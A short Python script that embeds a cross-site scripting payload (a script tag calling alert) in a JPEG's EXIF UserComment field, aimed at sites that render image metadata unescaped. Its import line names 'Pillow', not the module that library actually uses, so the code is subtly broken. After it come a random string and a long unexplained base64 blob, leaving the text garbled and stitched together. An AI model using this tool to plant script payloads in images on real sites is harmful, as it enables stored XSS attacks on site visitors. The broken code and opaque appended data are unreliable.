from Pillow import Image
import piexif
def embed_xss_payload(image_path, output_path, payload):
    try:
        img = Image.open(image_path)
        exif_dict = piexif.load(img.info.get("exif", b""))
        payload_bytes = payload.encode("utf-8")
        exif_dict["Exif"][piexif.ExifIFD.UserComment] = payload_bytes
        exif_bytes = piexif.dump(exif_dict)
        img.save(output_path, "jpeg", exif=exif_bytes)
        print(f"Payload successfully embedded into {output_path}")
    except Exception as e:
        print(f"Error embedding payload: {e}")
if __name__ == "__main__":
    input_image = "input.jpg"
    output_image = "output_with_payload.jpg"
    xss_payload = "<script>alert('XSS');</script>"
    embed_xss_payload(input_image, output_image, xss_payload)
XJYx8G7YKNa7&jmw3B*b


RJ9Lc7JORSomFBsyWV5/bc7pa9tWJdSedfqpSTF8fUivYAn2zh0uJq9gCfbOHS4mYaxbm3RDytys+Z5IKlg/f4PBm6wK4+u0EgL/0PrpdP90H5CR3f12N1rO7SbZtXSnf0veM/tM90Y14WchSVpvhiLDn7npoK+yCEpvhlI41BdqlKMZ5uEn6NcUcgIxTlQNAtLI4Vsh0Yma9mSiOqbUN2ObTCjbNoTkgVCyZReWclxFo+mE4oK5Zq1ohE9/swBGkN0aQW+q5BrODVJRkYJrwDB7CU28iy8vehQ7UD+iBKdBZS8MIPnAUAfxHcu2TlpnIHoC5nG0JlEsEaAFcEEdpQs7fDqtCSIxNGmNENMhcJ5/8GuDPtNvbKCIIGVzl68vWPNOejT8hLZ+fA/bEOaovU4JpI4wpUppVsgEtOKv6exaKxcz9ossGOAgqrmTgN9GmmDkhyS4oSQrgeS58gAtkM2qZNuKSUnzQRI6/xMMClQJQ6LzsuuIzxEXh1aWSfr+afTv+tbhqBq4YqiqjTE8ipqLaeY2T8gjQaM+aagjAC0kaxTz5cIGR9QOev53leArGzIu/C//BlaWgke680A9W79f6aSfCRI0TV+TBSH/IhraJMJ+nyJABa+sNYnN3pnDoksZSAtag8JJtU22iMit7r8lGovJG26jcbj2woICjgIo6UY7YUZ9s/maXBeeomdmqedxGhXszMdBFj20pWpFEfR2PqMIE4wuD5LwJMqIwOlsb5yyQ0YP4PbnbETpIiT6rkxLXWsN7wcbnwJGW2+l1wo/YYjw6//5jfXi25ekh/nZbeEfKF84Dg==
